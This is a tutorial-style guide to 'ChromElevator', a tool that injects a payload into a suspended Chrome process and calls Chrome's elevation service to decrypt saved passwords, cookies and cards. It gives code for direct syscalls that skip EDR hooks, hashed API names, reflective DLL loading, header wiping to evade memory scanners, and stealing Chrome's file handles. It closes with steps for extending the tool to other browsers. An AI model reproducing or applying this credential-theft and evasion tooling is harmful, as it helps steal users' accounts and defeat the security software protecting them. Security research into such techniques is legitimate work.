# ChromElevator: The Complete Teaching Guide

*A bedtime read for understanding every line of code, from first principles.*

---

## Part 1: What Problem Are We Solving?

### The Target: Chrome's Saved Passwords and Cookies

Chrome stores your passwords in a SQLite database:
```
C:\Users\YOU\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

The passwords aren't stored in plain text. They're encrypted. Before 2024, Chrome used **DPAPI** (Windows Data Protection API) — you could decrypt them offline if you had access to the user's Windows account.

### Chrome 127 Changed Everything (July 2024)

Google introduced **App-Bound Encryption (ABE)**. Now:

1. Chrome encrypts your passwords with an AES-256-GCM key
2. That key is ITSELF encrypted using a second layer
3. The second layer can ONLY be decrypted by Chrome's own **IElevator** COM service
4. IElevator checks WHO is calling — if it's not Chrome.exe, it refuses

```
BEFORE ABE:
    Encrypted Password → DPAPI → Plain Password
    (Any program could call DPAPI if running as your user)

AFTER ABE:
    Encrypted Password → AES-GCM Key → IElevator → Plain Password
    (Only Chrome.exe can talk to IElevator)
```

### Why Can't You Just Call IElevator Yourself?

IElevator is a **COM server** — a Windows service that other programs can talk to. But Chrome added a security check:

```cpp
// Inside IElevator (simplified)
HRESULT DecryptData(BSTR encrypted, BSTR* plaintext) {
    // WHO is calling me?
    WCHAR callerPath[MAX_PATH];
    GetCallerProcessPath(callerPath);
    
    // Is it Chrome.exe?
    if (!IsSignedByGoogle(callerPath)) {
        return E_ACCESSDENIED;  // Fuck off
    }
    
    // OK, decrypt
    *plaintext = DoTheDecryption(encrypted);
    return S_OK;
}
```

Your Python script? `python.exe` — not Chrome. Rejected.

### The Solution: BECOME Chrome

ChromElevator's insight: don't call IElevator from your program. **Inject code INTO Chrome** and call IElevator from there.

```
YOUR PROGRAM                    CHROME.EXE (hollowed)
     │                               │
     ├── Create Chrome suspended     │
     │                               │
     ├── Write payload into Chrome ──┤
     │                               │
     ├── Run payload inside Chrome   │
     │                               │
     │                          payload runs
     │                               │
     │                          calls IElevator
     │                               │
     │                          IElevator checks caller
     │                          "Is this Chrome.exe?"
     │                          YES → Decrypt allowed
     │                               │
     │◄─── Results via pipe ─────────┘
```

---

## Part 2: C++ Basics You Need

### What is `#pragma once`?

```cpp
#pragma once
```

This tells the compiler: "Only include this file once, even if multiple files try to include it."

Without it, you'd get "redefinition" errors when the same header is included from different places.

### What is `#include`?

```cpp
#include <Windows.h>    // Angle brackets = system header (in compiler's include path)
#include "myfile.hpp"   // Quotes = local file (in your project)
```

It literally copy-pastes the contents of that file into this file before compiling.

### What is a Header (`.hpp`) vs Source (`.cpp`)?

- **Header (`.hpp`)**: Declarations — "these functions/classes exist"
- **Source (`.cpp`)**: Definitions — "here's the actual code"

```cpp
// math.hpp (header)
int add(int a, int b);  // Declaration: "this function exists"

// math.cpp (source)
#include "math.hpp"
int add(int a, int b) { // Definition: "here's the code"
    return a + b;
}
```

### What is a Namespace?

```cpp
namespace Crypto {
    void Decrypt();
}

// To call it:
Crypto::Decrypt();
```

It's like a folder for code. Prevents name collisions.

### What is `struct` vs `class`?

Basically the same, but:
- `struct`: Everything is public by default
- `class`: Everything is private by default

```cpp
struct Point {
    int x;  // Public by default
    int y;
};

class Point {
public:     // Have to say "public"
    int x;
    int y;
};
```

### What is a Pointer?

A variable that holds a memory address.

```cpp
int value = 42;
int* ptr = &value;    // ptr holds the ADDRESS of value

*ptr = 100;           // Dereference: change what ptr points to
// Now value == 100
```

### What is RAII and `unique_ptr`?

**RAII** = Resource Acquisition Is Initialization

When you open a file or allocate memory, you need to clean it up. RAII means: tie cleanup to object destruction.

```cpp
// BAD: Manual cleanup (easy to forget)
HANDLE h = CreateFile(...);
// ... code ...
CloseHandle(h);  // What if you return early? Leak!

// GOOD: RAII wrapper
std::unique_ptr<void, HandleDeleter> h(CreateFile(...));
// When 'h' goes out of scope, destructor calls CloseHandle automatically
```

In `common.hpp`:
```cpp
struct HandleDeleter {
    void operator()(HANDLE h) const {
        if (h && h != INVALID_HANDLE_VALUE) CloseHandle(h);
    }
};
using UniqueHandle = std::unique_ptr<void, HandleDeleter>;
```

---

## Part 3: Windows Internals Basics

### What is a Process?

A running program. Has its own:
- **Memory space**: Can't see other processes' memory
- **Handles**: References to files, threads, other OS objects
- **Threads**: Execution contexts (can have many per process)

### What is a Handle?

An opaque number that represents a kernel object. Like a ticket:

```
Your code: "I want to read file X"
Windows:   "OK here's handle 0x1234"
Your code: "Read 100 bytes from handle 0x1234"
Windows:   [looks up what 0x1234 refers to, does the read]
```

### What is the PEB (Process Environment Block)?

A structure in every process's memory containing info about that process:
- Loaded DLLs
- Command line
- Environment variables
- Whether being debugged

Located at a fixed offset from the GS/TEB register:
```cpp
// x64
ULONG_PTR peb = __readgsqword(0x60);
```

### What is ntdll.dll?

The lowest-level Windows DLL. Contains the "syscall stubs" — thin wrappers that transition from user mode to kernel mode.

```
Your code
    ↓
kernel32.dll (high-level: CreateFile)
    ↓
ntdll.dll (low-level: NtCreateFile)
    ↓
syscall instruction
    ↓
Windows kernel
```

### What is a Syscall?

A CPU instruction that switches from user mode to kernel mode:
- **x64**: `syscall` instruction, syscall number in `eax`
- **ARM64**: `svc` instruction, syscall number in `x8`

The kernel looks at the number and dispatches to the right handler.

### What is a Syscall Number (SSN)?

Each kernel function has a number. Changes between Windows versions!

```
NtOpenFile:
  Windows 10 1903: 0x33
  Windows 10 2004: 0x34
  Windows 11 22H2: 0x35
```

That's why ChromElevator resolves SSNs at runtime, not hardcoded.

---

## Part 4: Why Direct Syscalls?

### EDR Hooks

Endpoint Detection and Response (EDR) products hook ntdll.dll functions:

```
ORIGINAL ntdll!NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18       ; SSN
    syscall
    ret

HOOKED (by EDR):
    jmp EDR_Monitor     ; EDR inserted this
    mov r10, rcx        ; Original code (maybe)
    mov eax, 0x18
    syscall
    ret
```

Every time you call `NtAllocateVirtualMemory`, EDR sees it first.

### The Bypass

Don't call the hooked function. Call `syscall` directly:

```cpp
// Instead of calling ntdll!NtAllocateVirtualMemory (which is hooked)...

// 1. Find the SSN by parsing ntdll's export table
WORD ssn = ResolveSyscallNumber("NtAllocateVirtualMemory");

// 2. Find a "syscall; ret" sequence in ntdll (the gadget)
void* gadget = FindSyscallGadget();

// 3. Set up registers and call the gadget directly
mov eax, ssn
call gadget   // gadget does: syscall; ret
```

EDR's hook never executes because you skip over it.

---

## Part 5: The internal_api.cpp Deep Dive

This file implements the syscall engine. Let's trace through it.

### Step 1: Hash Function (Hide Function Names)

```cpp
constexpr uint32_t djb2_hash(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + static_cast<uint8_t>(*str++);
    }
    return hash;
}
```

Why hash? So "NtAllocateVirtualMemory" doesn't appear as a string in the binary. Instead we have `0xABCD1234` — harder to signature.

`constexpr` = computed at compile time. The hash is baked into the binary, never computed at runtime.

### Step 2: Find the Syscall Gadget

```cpp
PVOID FindSyscallGadget(PVOID func) {
    auto bytes = reinterpret_cast<uint8_t*>(func);
    for (int i = 0; i < 64; ++i) {
        // Look for: syscall; ret (0F 05 C3)
        if (bytes[i] == 0x0F && bytes[i + 1] == 0x05 && bytes[i + 2] == 0xC3) {
            return bytes + i;
        }
        // Skip JMP hooks (E9 xx xx xx xx)
        if (bytes[i] == 0xE9) i += 4;
    }
    return nullptr;
}
```

We scan the function's bytes looking for the pattern `0F 05 C3`:
- `0F 05` = `syscall` instruction
- `C3` = `ret` instruction

If EDR placed a `JMP` (0xE9), we skip over it.

### Step 3: Resolve All Syscalls

```cpp
bool InitApi(bool) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    // Parse PE header to find export table
    auto pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    auto pNtHeaders = (PIMAGE_NT_HEADERS)(hNtdll + pDosHeader->e_lfanew);
    auto pExportDir = (PIMAGE_EXPORT_DIRECTORY)(hNtdll + ...);
```

We're manually parsing ntdll.dll's **PE structure** to find its exports.

**PE = Portable Executable** — the Windows executable format. Structure:
```
DOS Header (MZ)
NT Headers (PE signature + file header + optional header)
Section Headers (.text, .data, .rdata, etc.)
Sections (actual code and data)
```

The export table lists all functions the DLL exports, with their names and addresses.

### Step 4: Sort by Address = Get SSN

```cpp
// Collect all Zw* exports
for (DWORD i = 0; i < numberOfNames; ++i) {
    char* name = (char*)(hNtdll + nameRvas[i]);
    if (name[0] == 'Z' && name[1] == 'w') {
        syscalls.push_back({address, hash(name)});
    }
}

// Sort by address
std::sort(syscalls.begin(), syscalls.end(), 
    [](auto& a, auto& b) { return a.address < b.address; });
```

**Key insight**: In ntdll, syscall functions are ordered by their SSN. The first `Zw*` function has SSN 0, second has SSN 1, etc.

By sorting by address, position in array = SSN.

### Step 5: The Wrapper Functions

```cpp
NTSTATUS NtAllocateVirtualMemory_syscall(...) {
    return SyscallTrampoline(&g_syscall_stubs.NtAllocateVirtualMemory, ...);
}
```

These are C++ functions that call the assembly trampoline with the right `SYSCALL_ENTRY` and arguments.

---

## Part 6: The Assembly Trampoline

This is `syscall_trampoline_x64.asm`. It's the actual code that executes the syscall.

```asm
SyscallTrampoline PROC FRAME
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rdi
    push    rsi
    sub     rsp, 80h          ; Allocate stack space
```

**PROC FRAME**: Tells assembler this is a function with proper stack frame (for debugging/exceptions).

**Push registers**: Save callee-saved registers we'll use.

**sub rsp, 80h**: Make room on stack for arguments (syscalls can have up to 11 args).

```asm
    mov     rbx, rcx          ; Save SYSCALL_ENTRY* pointer
```

First argument (rcx in x64 calling convention) is pointer to our `SYSCALL_ENTRY` struct.

```asm
    ; Marshal arguments
    mov     r10, rdx          ; Arg1 (syscalls use r10, not rcx)
    mov     rdx, r8           ; Arg2
    mov     r8, r9            ; Arg3
    mov     r9, [rbp+30h]     ; Arg4 (from stack)
```

**Syscall convention is different from C++**:
- C++ uses: rcx, rdx, r8, r9, stack
- Syscall uses: r10, rdx, r8, r9, stack

We shift everything over.

```asm
    ; Copy stack arguments
    lea     rsi, [rbp+38h]    ; Source: caller's stack args
    lea     rdi, [rsp+20h]    ; Destination: our stack
    mov     rcx, 8            ; Copy 8 qwords
    rep     movsq             ; Block copy
```

Copy remaining arguments from caller's stack to our stack frame.

```asm
    ; Load syscall number
    movzx   eax, word ptr [rbx+12]  ; SSN from SYSCALL_ENTRY
    
    ; Load gadget address
    mov     r11, [rbx]              ; pSyscallGadget from SYSCALL_ENTRY
    
    ; Execute!
    call    r11                     ; Calls: syscall; ret
```

**The moment of truth**: 
1. Load SSN into `eax` (where kernel expects it)
2. Load gadget address
3. `call` the gadget, which executes `syscall; ret`

Kernel receives the syscall, does the operation, returns result in `eax`.

```asm
    ; Cleanup
    add     rsp, 80h
    pop     rsi
    pop     rdi
    pop     rbx
    pop     rbp
    ret
```

Restore stack and registers, return to C++ caller.

---

## Part 7: The Bootstrap Loader (Reflective DLL Injection)

When we inject into Chrome, we can't just `LoadLibrary` our DLL — that would be detected. Instead, we **manually load** the DLL ourselves.

`bootstrap.cpp` does this. It's the first code that runs in Chrome.

### Step 1: Find Our Own Base Address

```cpp
ULONG_PTR base = GetIp();  // Get current instruction pointer

// Walk backwards to find MZ header
while (true) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {  // "MZ"
        auto nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {  // "PE\0\0"
            break;  // Found our own DLL in memory
        }
    }
    base--;
}
```

We were injected as raw bytes. Find where our DLL starts by looking for the "MZ" DOS signature.

### Step 2: Find Kernel32 and Ntdll

```cpp
// Get PEB
peb = __readgsqword(0x60);

// Walk loaded module list
auto ldr = ((PEB_LITE*)peb)->Ldr;
auto head = &ldr->InMemoryOrderModuleList;

for (auto curr = head->Flink; curr != head; curr = curr->Flink) {
    auto entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_LITE, InMemoryOrderLinks);
    
    DWORD hash = HashModuleName(&entry->BaseDllName);
    if (hash == H_KERNEL32) kernel32Base = entry->DllBase;
    if (hash == H_NTDLL) ntdllBase = entry->DllBase;
}
```

The PEB contains a **linked list of loaded modules**. We walk it to find kernel32.dll and ntdll.dll by hashing their names.

### Step 3: Resolve Critical Functions

```cpp
// Find LoadLibraryA and GetProcAddress in kernel32
for (each export in kernel32) {
    if (hash(name) == H_LOADLIBRARYA) pLoadLibraryA = address;
    if (hash(name) == H_GETPROCADDRESS) pGetProcAddress = address;
}
```

We need these to load our DLL's dependencies.

### Step 4: Allocate New Memory (via Syscall!)

```cpp
SyscallEntry scAlloc = ResolveSyscall(ntdllBase, H_ZwAllocateVirtualMemory, 6);

PVOID newBase = nullptr;
SIZE_T allocSize = imageSize;

// Direct syscall — bypasses hooks
SyscallTrampoline(&scAlloc, (HANDLE)-1, &newBase, 0, 
                  &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Even inside Chrome, we use direct syscalls for stealth.

### Step 5: Copy PE Sections

```cpp
// Copy headers
for (i = 0; i < sizeOfHeaders; i++) {
    dst[i] = src[i];
}

// Copy each section (.text, .data, .rdata, etc.)
for (each section) {
    memcpy(newBase + section.VirtualAddress, 
           oldBase + section.PointerToRawData,
           section.SizeOfRawData);
}
```

### Step 6: Process Relocations

```cpp
ULONG_PTR delta = newBase - preferredBase;

if (delta != 0) {
    // DLL didn't load at preferred address
    // Need to fix all absolute addresses
    
    for (each relocation entry) {
        if (entry.type == IMAGE_REL_BASED_DIR64) {
            *(ULONG_PTR*)(newBase + entry.offset) += delta;
        }
    }
}
```

DLLs have a "preferred" load address. If we load elsewhere, we must patch all hardcoded addresses.

### Step 7: Resolve Imports

```cpp
for (each imported DLL) {
    HMODULE hMod = pLoadLibraryA(dllName);
    
    for (each imported function) {
        FARPROC func = pGetProcAddress(hMod, funcName);
        *importEntry = func;  // Fill in the Import Address Table
    }
}
```

Our DLL needs functions from other DLLs. Load them and fill in the addresses.

### Step 8: Destroy PE Headers

```cpp
// Overwrite headers with random garbage
ULONG_PTR seed = __rdtsc();
for (i = 0; i < headerSize; i++) {
    seed = seed * 1103515245 + 12345;  // LCG
    headerBytes[i] = (BYTE)(seed >> 16);
}
```

Memory scanners look for "MZ" signatures. Trash the headers so we're harder to find.

### Step 9: Set Section Permissions

```cpp
for (each section) {
    ULONG protect = PAGE_READONLY;
    if (section.Characteristics & IMAGE_SCN_MEM_EXECUTE)
        protect = PAGE_EXECUTE_READ;
    if (section.Characteristics & IMAGE_SCN_MEM_WRITE)
        protect = PAGE_READWRITE;
    
    // Via syscall
    SyscallTrampoline(&scProtect, ...);
}
```

Make code executable, data writable, etc. — just like the OS would.

### Step 10: Call DllMain

```cpp
auto pDllMain = (DllMain_t)(newBase + entryPoint);
pDllMain(newBase, DLL_PROCESS_ATTACH, lpParameter);
```

Finally, call the DLL's entry point. Now our payload is fully loaded and running inside Chrome.

---

## Part 8: The COM Interface (IElevator)

Now we're running inside Chrome. Time to call IElevator.

### What is COM?

Component Object Model — Windows' way of letting programs talk to services. Think of it as:
- **CLSID**: ID of the service (like a phone number)
- **IID**: ID of the interface (like an extension)
- **Interface**: The actual functions you can call

### The IElevator Interface

```cpp
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown {
public:
    virtual HRESULT RunRecoveryCRXElevated(...) = 0;
    virtual HRESULT EncryptData(...) = 0;
    virtual HRESULT DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};
```

**MIDL_INTERFACE**: Defines a COM interface with a GUID.

**virtual ... = 0**: Pure virtual function (must be implemented by the service).

**BSTR**: COM's string type (length-prefixed wide string).

### Calling IElevator

```cpp
// Create instance of Chrome's elevation service
CLSID clsid = {0x708860E0, 0xF641, 0x4611, ...};  // Chrome Elevation Service
IID iid = {0xA949CB4E, 0xC4F9, 0x44C4, ...};      // IElevator interface

Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
HRESULT hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);

// Set security (authenticate as ourselves)
CoSetProxyBlanket(elevator.Get(), ...);

// Call DecryptData
BSTR encrypted = SysAllocStringByteLen((char*)key.data(), key.size());
BSTR decrypted = nullptr;
DWORD error = 0;

hr = elevator->DecryptData(encrypted, &decrypted, &error);
```

**Why this works**: Chrome's elevation service checks if the caller is Chrome.exe. We're running INSIDE Chrome.exe, so the check passes.

---

## Part 9: AES-GCM Decryption

Once we have the decrypted key, we use it to decrypt the actual passwords/cookies.

### Chrome's Encryption Format

```
v20 | IV (12 bytes) | Ciphertext | Tag (16 bytes)
```

- **v20**: Version prefix
- **IV**: Initialization vector (random, unique per encryption)
- **Ciphertext**: The encrypted data
- **Tag**: Authentication tag (proves data wasn't tampered)

### The Decryption Code

```cpp
std::optional<std::vector<uint8_t>> AesGcm::Decrypt(
    const std::vector<uint8_t>& key, 
    const std::vector<uint8_t>& encryptedData) {
    
    // Parse the format
    const uint8_t* iv = encryptedData.data() + 3;  // Skip "v20"
    const uint8_t* tag = encryptedData.data() + (size - 16);
    const uint8_t* ct = iv + 12;
    
    // Set up Windows CNG
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, ...);
    BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, key.data(), key.size(), 0);
    
    // Decrypt
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    authInfo.pbNonce = iv;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;
    
    BCryptDecrypt(hKey, ct, ctLen, &authInfo, nullptr, 0, 
                  plaintext.data(), plaintext.size(), &outLen, 0);
    
    return plaintext;
}
```

**BCrypt**: Windows' cryptography API. We use it for AES-GCM decryption.

---

## Part 10: Handle Duplication (Reading Locked Files)

Chrome keeps its databases open. If you try to read `Cookies` while Chrome is running, you get "file in use."

### The Solution

Instead of opening the file ourselves, we **steal Chrome's handle**.

```cpp
// 1. Enumerate all handles in the system
NtQuerySystemInformation(SystemExtendedHandleInformation, buffer, ...);

// 2. Find handles belonging to Chrome
for (each handle) {
    if (handle.ProcessId == chromePid) {
        // 3. Duplicate the handle into our process
        NtDuplicateObject(
            chromeProcess, handle.Value,  // Source
            GetCurrentProcess(), &ourHandle,  // Destination
            FILE_READ_DATA, 0, 0
        );
        
        // 4. Check if it's the file we want
        NtQueryObject(ourHandle, ObjectNameInformation, &nameInfo, ...);
        if (nameInfo.Name contains "Cookies") {
            // Found it! Now we can read through ourHandle
        }
    }
}
```

We're literally reaching into Chrome's process and copying its file handles to ourselves.

---

## Part 11: The Named Pipe (Communication)

The injector and payload are in different processes. They communicate via a **named pipe**.

### What's a Named Pipe?

A kernel-managed buffer that two processes can read/write. Like a tube connecting them.

```cpp
// Injector (server side)
HANDLE hPipe = CreateNamedPipeW(
    L"\\\\.\\pipe\\chrome.sync.12345.67890.ABCD",  // Name
    PIPE_ACCESS_DUPLEX,           // Both directions
    PIPE_TYPE_MESSAGE,            // Message-oriented
    1,                            // One client
    4096, 4096,                   // Buffer sizes
    0, nullptr);

ConnectNamedPipe(hPipe, nullptr);  // Wait for payload to connect

// Payload (client side)
HANDLE hPipe = CreateFileW(pipeName, GENERIC_READ | GENERIC_WRITE, ...);

// Now they can talk
WriteFile(hPipe, "Hello", 5, ...);
ReadFile(hPipe, buffer, size, ...);
```

### Message Protocol

The payload sends structured messages:
```
PROFILE:Default
COOKIES:243:300
PASSWORDS:3:3
TOKENS:1:1
DONE
```

The injector parses these and shows progress.

---

## Part 12: The Full Flow

1. **chromelevator.exe** starts
2. Calls `InitApi()` — resolves syscall numbers
3. Finds Chrome installation
4. Creates Chrome.exe **suspended** (no code runs yet)
5. Creates a named pipe for communication
6. Decrypts the embedded payload DLL (ChaCha20)
7. Allocates memory in Chrome via **direct syscall**
8. Writes payload + pipe name to Chrome's memory
9. Creates remote thread at payload's Bootstrap export
10. Waits for payload to connect to pipe

11. **Payload** (inside Chrome) starts
12. Bootstrap reflectively loads itself
13. Payload's DllMain runs
14. Connects to pipe
15. Calls IElevator.DecryptData — gets AES key
16. Opens SQLite databases (duplicating handles if locked)
17. Decrypts cookies, passwords, cards
18. Writes JSON files
19. Sends stats to injector via pipe

20. **Injector** receives DONE message
21. Terminates Chrome process
22. Reports results

---

## Part 13: Why Each Piece Matters

| Component | Why It Exists |
|-----------|---------------|
| Direct syscalls | Bypass EDR hooks |
| Hash-based resolution | No plaintext function names in binary |
| Reflective loading | Avoid LoadLibrary detection |
| Header destruction | Evade memory scanners |
| Process hollowing | Run as trusted Chrome.exe |
| Handle duplication | Read locked database files |
| Named pipe IPC | Communication without network |
| ChaCha20 encryption | Payload is encrypted until runtime |

---

## Part 14: How to Modify It

### Change the Output Format

Edit `data_extractor.cpp`:
```cpp
void DataExtractor::ExtractPasswords(...) {
    // Change the JSON format here
    ss << "{\"site\":\"" << url << "\", ...}";
}
```

### Add Another Browser

Edit `browser_config.hpp`:
```cpp
inline std::vector<BrowserInfo> GetBrowserConfigs() {
    return {
        {"Chrome", L"chrome.exe", ...},
        {"MyBrowser", L"mybrowser.exe", clsid, iid},  // Add here
    };
}
```

### Change the Pipe Name Pattern

Edit `pipe_server.cpp`:
```cpp
std::wstring GeneratePipeName() {
    // Change the pattern here
    return L"\\\\.\\pipe\\mypattern." + random;
}
```

---

## Part 15: Glossary

| Term | Meaning |
|------|---------|
| **ABE** | App-Bound Encryption — Chrome's key binding system |
| **AES-GCM** | Encryption algorithm Chrome uses for credentials |
| **CLSID** | Class ID — identifies a COM service |
| **COM** | Component Object Model — Windows IPC mechanism |
| **EDR** | Endpoint Detection and Response — security software |
| **IID** | Interface ID — identifies a COM interface |
| **PE** | Portable Executable — Windows executable format |
| **PEB** | Process Environment Block — process metadata |
| **RDI** | Reflective DLL Injection — loading a DLL manually |
| **SSN** | Syscall Service Number — identifies a kernel function |
| **Syscall** | CPU instruction to enter kernel mode |
| **VTable** | Virtual function table — how COM methods are called |

---

## Final Thoughts

This is real offensive security engineering. Each component exists because of a specific defense:

- EDR hooks ntdll → Direct syscalls
- Memory scanners look for MZ → Header destruction
- Process monitoring watches CreateRemoteThread → Suspended process + hollowing
- IElevator validates caller → Code injection into Chrome

Understanding each defense and its bypass is the core of offensive research.

Sleep well. Tomorrow, try reading the code again — it'll make more sense.

---

*Document generated for research and education.*
